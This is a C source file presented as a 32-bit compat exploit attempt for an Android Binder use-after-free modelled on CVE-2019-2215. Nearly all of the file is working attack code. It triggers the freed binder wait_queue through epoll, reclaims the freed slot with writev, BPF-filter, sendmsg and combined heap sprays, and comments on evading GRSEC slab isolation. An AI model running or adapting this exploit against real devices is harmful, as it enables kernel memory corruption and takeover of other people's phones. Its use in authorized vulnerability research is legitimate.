/*
 * compat_binder_uaf.c — 32-bit Binder UAF Exploit Attempt
 *
 * Compile: arm-linux-musleabihf-gcc -static -O2 -o compat_binder_uaf compat_binder_uaf.c -lpthread
 *
 * Strategy: CVE-2019-2215 style binder UAF from a 32-bit (compat) process.
 * The compat syscall path uses different struct sizes:
 *   - struct iovec is 8 bytes (not 16)
 *   - binder_write_read uses 32-bit pointers
 *
 * If GRSEC per-callsite slab isolation distinguishes compat_sys_writev
 * from sys_writev, the freed binder_thread wait_queue entry might be
 * reclaimable from the compat iovec path.
 *
 * The wait_queue_t is typically 24 bytes on 32-bit:
 *   unsigned int flags (4) + task_struct* (4) + func ptr (4) +
 *   list_head (8) + padding = ~24 bytes -> kmalloc-32
 *
 * We spray with:
 *   1. iovec arrays via writev (compat path)
 *   2. BPF filters via setsockopt (8-byte sock_filter structs)
 *   3. sendmsg cmsg data
 *   4. setxattr
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <stdint.h>

/* Binder ioctls — 32-bit struct versions */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BC_ENTER_LOOPER         13
#define BC_FREE_BUFFER          6

struct binder_write_read {
    int32_t write_size;
    int32_t write_consumed;
    uint32_t write_buffer;   /* 32-bit pointer */
    int32_t read_size;
    int32_t read_consumed;
    uint32_t read_buffer;    /* 32-bit pointer */
};

struct binder_version {
    int32_t protocol_version;
};

/* Sentinel patterns for detecting reclamation */
#define SENTINEL_A  0x41414141
#define SENTINEL_B  0x42424242
#define SENTINEL_C  0x43434343

/*
 * Spray strategy 1: writev with large iovec array
 * Each compat iovec is 8 bytes. Writing 4 iovecs = 32 bytes allocation
 * which matches the wait_queue_t size on 32-bit.
 */
static int spray_writev(int count)
{
    int success = 0;
    for (int i = 0; i < count; i++) {
        int pfd[2];
        if (pipe(pfd) < 0) break;

        /* 4 iovecs × 8 bytes = 32-byte kernel allocation for iovec array */
        char buf[4] = "AAAA";
        struct iovec iov[4];
        for (int j = 0; j < 4; j++) {
            iov[j].iov_base = buf;
            iov[j].iov_len = 1;
        }

        /* writev will allocate a kernel copy of the iovec array */
        ssize_t w = writev(pfd[1], iov, 4);
        if (w > 0) success++;

        /* Don't close — keep the allocation alive */
        /* close(pfd[0]); close(pfd[1]); */
    }
    return success;
}

/*
 * Spray strategy 2: BPF sock_filter arrays
 * Each sock_filter is 8 bytes. 4 instructions = 32-byte allocation.
 */
static int spray_bpf(int socks[], int count)
{
    struct sock_filter {
        uint16_t code;
        uint8_t jt, jf;
        uint32_t k;
    };

    /* 4 instructions × 8 bytes = 32-byte BPF program */
    struct sock_filter insns[4] = {
        { 0x06, 0, 0, 0xFFFF }, /* RET ALLOW */
        { 0x06, 0, 0, 0xFFFF },
        { 0x06, 0, 0, 0xFFFF },
        { 0x06, 0, 0, 0xFFFF },
    };

    struct {
        uint16_t len;
        void *filter;
    } prog;
    prog.len = 4;
    prog.filter = insns;

    int attached = 0;
    for (int i = 0; i < count; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] < 0) continue;
        if (setsockopt(socks[i], SOL_SOCKET, 26 /* SO_ATTACH_FILTER */,
                       &prog, sizeof(prog)) == 0)
            attached++;
    }
    return attached;
}

/*
 * Spray strategy 3: sendmsg with cmsg (control message) data
 * cmsg data is kmalloc'd in the kernel. We can control the size.
 */
static int spray_sendmsg(int count)
{
    int success = 0;
    for (int i = 0; i < count; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) continue;

        char data = 'X';
        struct iovec iov = { .iov_base = &data, .iov_len = 1 };

        /* cmsg with 24 bytes of data -> ~32 byte allocation with header */
        char cmsg_buf[CMSG_SPACE(24)];
        memset(cmsg_buf, 0x41, sizeof(cmsg_buf));
        struct cmsghdr *cmsg = (struct cmsghdr *)cmsg_buf;
        cmsg->cmsg_len = CMSG_LEN(24);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;

        struct msghdr msg = {0};
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        if (sendmsg(sv[0], &msg, MSG_DONTWAIT) > 0)
            success++;

        /* Keep sv[1] open so the cmsg stays in kernel memory */
        close(sv[0]);
        /* Don't close sv[1] */
    }
    return success;
}

/*
 * UAF trigger: binder thread exit with epoll registered
 *
 * 1. Open binder, mmap buffer
 * 2. Create epoll, add binder fd
 * 3. Enter looper (registers wait_queue)
 * 4. BINDER_THREAD_EXIT frees the wait_queue entry
 * 5. Spray to reclaim freed memory
 * 6. epoll_ctl DEL touches freed/reclaimed memory
 */
static void trigger_uaf(int bfd, int spray_type)
{
    /* Enter looper */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint32_t)(uintptr_t)&cmd;
    int ret = ioctl(bfd, BINDER_WRITE_READ, &bwr);
    printf("  ENTER_LOOPER: ret=%d\n", ret);

    /* Create epoll monitoring binder */
    int epfd = epoll_create(1);
    if (epfd < 0) {
        printf("  epoll_create: FAIL (%d)\n", errno);
        return;
    }

    struct epoll_event ev = {
        .events = EPOLLIN,
        .data = { .fd = bfd }
    };
    ret = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  epoll_ctl ADD: %s\n", ret == 0 ? "OK" : "FAIL");
    if (ret < 0) {
        close(epfd);
        return;
    }

    /* THREAD_EXIT — frees the binder_thread and its wait_queue entry */
    printf("  >>> BINDER_THREAD_EXIT (freeing wait_queue) <<<\n");
    int32_t dummy = 0;
    ret = ioctl(bfd, BINDER_THREAD_EXIT, &dummy);
    printf("  THREAD_EXIT: ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

    /* === SPRAY PHASE === */
    printf("  --- Spraying to reclaim freed memory (type=%d) ---\n", spray_type);

    int bpf_socks[200];
    int sprayed = 0;

    switch (spray_type) {
    case 0:
        sprayed = spray_writev(200);
        printf("  writev spray: %d\n", sprayed);
        break;
    case 1:
        sprayed = spray_bpf(bpf_socks, 200);
        printf("  BPF spray: %d\n", sprayed);
        break;
    case 2:
        sprayed = spray_sendmsg(100);
        printf("  sendmsg spray: %d\n", sprayed);
        break;
    case 3:
        /* Combined spray */
        sprayed = spray_writev(100);
        printf("  writev spray: %d\n", sprayed);
        sprayed += spray_bpf(bpf_socks, 100);
        printf("  + BPF spray: total %d\n", sprayed);
        break;
    }

    /* === TRIGGER PHASE === */
    /* epoll_ctl DEL will dereference the freed wait_queue entry */
    printf("  >>> epoll_ctl DEL (touching freed memory) <<<\n");
    ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);
    printf("  epoll_ctl DEL: ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

    /* If we're still alive, try epoll_wait which also touches the waitqueue */
    printf("  >>> epoll_wait (reading freed memory) <<<\n");
    struct epoll_event events[1];
    ret = epoll_wait(epfd, events, 1, 100);
    printf("  epoll_wait: ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

    /* Cleanup */
    close(epfd);
    for (int i = 0; i < 200; i++) {
        if (spray_type == 1 || spray_type == 3) {
            if (bpf_socks[i] >= 0) close(bpf_socks[i]);
        }
    }
}

/*
 * Multiple rounds with different spray strategies
 */
int main(void)
{
    printf("=== 32-bit Compat Binder UAF ===\n");
    printf("uid=%d pid=%d sizeof(void*)=%zu sizeof(long)=%zu\n\n",
           getuid(), getpid(), sizeof(void *), sizeof(long));

    signal(SIGPIPE, SIG_IGN);
    signal(SIGSEGV, SIG_IGN);  /* Try to survive crashes */
    signal(SIGBUS, SIG_IGN);

    /* Phase 1: Verify binder is accessible */
    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) {
        printf("FATAL: /dev/binder: %s\n", strerror(errno));
        return 1;
    }

    struct binder_version ver = {0};
    ioctl(bfd, BINDER_VERSION, &ver);
    printf("Binder version: %d\n", ver.protocol_version);

    /* mmap binder buffer (required for binder operations) */
    void *bmap = mmap(NULL, 1024 * 1024,
                      PROT_READ, MAP_PRIVATE, bfd, 0);
    printf("Binder mmap: %s (%p)\n\n",
           bmap != MAP_FAILED ? "OK" : "FAIL", bmap);

    uint32_t max_threads = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &max_threads);

    close(bfd);

    /* Phase 2: Run UAF with each spray type */
    const char *spray_names[] = {
        "writev (compat iovec)",
        "BPF sock_filter",
        "sendmsg cmsg",
        "combined writev+BPF"
    };

    for (int spray_type = 0; spray_type < 4; spray_type++) {
        printf("=== Round %d: %s spray ===\n", spray_type, spray_names[spray_type]);

        /* Fresh binder fd for each round */
        bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) {
            printf("  /dev/binder: FAIL\n");
            continue;
        }

        bmap = mmap(NULL, 1024 * 1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) {
            printf("  mmap: FAIL\n");
            close(bfd);
            continue;
        }

        max_threads = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max_threads);

        trigger_uaf(bfd, spray_type);

        printf("  [survived]\n\n");

        if (bmap != MAP_FAILED) munmap(bmap, 1024 * 1024);
        close(bfd);
    }

    /* Phase 3: Rapid-fire UAF without spray (timing baseline) */
    printf("=== Rapid-fire baseline (no spray) ===\n");
    for (int i = 0; i < 10; i++) {
        bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) continue;

        bmap = mmap(NULL, 1024 * 1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); continue; }

        max_threads = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max_threads);

        uint32_t cmd = BC_ENTER_LOOPER;
        struct binder_write_read bwr = {0};
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (uint32_t)(uintptr_t)&cmd;
        ioctl(bfd, BINDER_WRITE_READ, &bwr);

        int epfd = epoll_create(1);
        struct epoll_event ev = { .events = EPOLLIN, .data = { .fd = bfd } };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        /* No spray — just immediately trigger */
        int ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);
        printf("  [%d] DEL: ret=%d errno=%d\n", i, ret, ret < 0 ? errno : 0);

        close(epfd);
        munmap(bmap, 1024 * 1024);
        close(bfd);
    }

    printf("\n=== Done (pid %d still alive) ===\n", getpid());
    return 0;
}
